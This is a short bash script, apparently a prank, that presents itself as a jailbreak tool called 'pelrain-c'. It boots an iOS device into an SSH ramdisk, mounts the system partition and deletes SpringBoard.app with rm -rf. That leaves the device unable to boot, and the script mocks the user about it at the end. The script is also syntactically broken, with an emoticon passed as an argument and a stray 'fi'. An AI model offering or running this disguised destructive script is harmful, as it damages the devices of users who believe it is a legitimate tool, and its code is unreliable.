#!/usr/bin/env bash

echo "pelrain-c 6.9.4.2.0 - Written by pelrain team"
cd 
git clone https://github.com/verygenericname/SSHRD_Script.git --recursive
cd SSHRD_Script
./sshrd.sh ( ͠° ͟ʖ ͡°)
./sshrd.sh boot
./sshrd.sh ssh
sleep 5
./sshrd.sh ssh
mount_filesystems /mnt1
rm -rf /mnt1/System/Library/CoreServices/SpringBoard.app
logout
./sshrd.sh reboot
echo "Done! Your device should be rebooting now"
echo "If your device isn't booting, L."
fi
